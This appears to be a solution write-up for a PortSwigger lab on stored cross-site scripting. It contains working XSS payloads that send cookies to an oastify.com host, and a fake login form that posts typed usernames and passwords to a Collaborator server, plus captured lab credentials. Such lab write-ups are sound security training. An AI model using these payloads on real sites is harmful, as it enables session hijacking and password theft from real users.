
# 5 - Exploiting cross-site scripting to capture passwords

This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.

Note: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

Some users will notice that there is an alternative solution to this lab that does not require Burp Collaborator. However, it is far less subtle than exfiltrating the credentials.

---------------------------------------------

Reference: https://portswigger.net/web-security/cross-site-scripting

---------------------------------------------

Generated link: https://0a4b0017031c1eafc216d371007b007a.web-security-academy.net/


We test the most simple XSS payload:



![img](images/5%20-%20Exploiting%20cross-site%20scripting%20to%20capture%20passwords/1.png)

It gets executed:



![img](images/5%20-%20Exploiting%20cross-site%20scripting%20to%20capture%20passwords/2.png)


Next we test a payload from https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md: 

```
<script>var i=new Image;i.src="http://ecu0uhyerytdj8d8vdyuowv8zz5qtlha.oastify.com/?cookie="+document.cookie;</script>
```

Or

```
<img src=x onerror="this.src='http://ecu0uhyerytdj8d8vdyuowv8zz5qtlha.oastify.com/?cookie='+document.cookie; this.removeAttribute('onerror');">
```




![img](images/5%20-%20Exploiting%20cross-site%20scripting%20to%20capture%20passwords/3.png)

We get an HTTP request with the cookie:



![img](images/5%20-%20Exploiting%20cross-site%20scripting%20to%20capture%20passwords/4.png)

Next I opened the Firefox debugger's Console and set the cookie:

```
document.cookie="secret=5yN1hPLMMamjE1mFPVb7ocKMq7BSYyTK"
```



![img](images/5%20-%20Exploiting%20cross-site%20scripting%20to%20capture%20passwords/5.png)

But that does not work...


Solution:

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```



![img](images/5%20-%20Exploiting%20cross-site%20scripting%20to%20capture%20passwords/6.png)

Collaborator response:



![img](images/5%20-%20Exploiting%20cross-site%20scripting%20to%20capture%20passwords/7.png)

Solved with credentials administrator:ec7ga43qyd9zisyb4h4i:



![img](images/5%20-%20Exploiting%20cross-site%20scripting%20to%20capture%20passwords/8.png)